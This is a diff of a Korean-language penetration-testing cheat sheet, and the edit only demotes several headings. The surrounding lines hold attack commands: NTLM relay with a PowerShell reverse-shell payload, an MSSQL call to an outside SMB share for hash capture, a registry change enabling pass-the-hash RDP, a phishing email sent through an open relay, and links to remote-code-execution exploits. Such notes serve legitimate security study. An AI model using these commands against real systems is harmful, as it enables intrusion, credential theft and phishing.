@@ -67,7 +67,7 @@ rpcclient $> enumdomusers
 ### Impacket-ntlmrelayx를 사용한 명령 실행 (예 : Reverse Shell)
 ```impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>```
 
-## 'SMBGhost' Remote Code Execution
+### 'SMBGhost' Remote Code Execution
 - https://www.exploit-db.com/exploits/48537
 
 <br/><br/>
@@ -137,7 +137,7 @@ EXEC master..xp_subdirs '\\10.10.110.17\share\'
 ### (PtH)로 RDP GUI 접속 가능하도록 레지스트리 추가
 ```reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f```
 
-## CVE-2019-0708 (BlueKeep)
+### CVE-2019-0708 (BlueKeep)
 - https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/
 
 <br/><br/>
@@ -216,6 +216,5 @@ USER john
 ### Open Relay 서비스 이용하여 메일 발송
 ```swaks --from notifications@domain.com --to employees@domain.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://domain.com/' --server 192.168.1.1```
 
-## OpenSMTPD 6.6.1 - Remote Code Execution
+### OpenSMTPD 6.6.1 - Remote Code Execution
 - https://www.exploit-db.com/exploits/47984
-- 
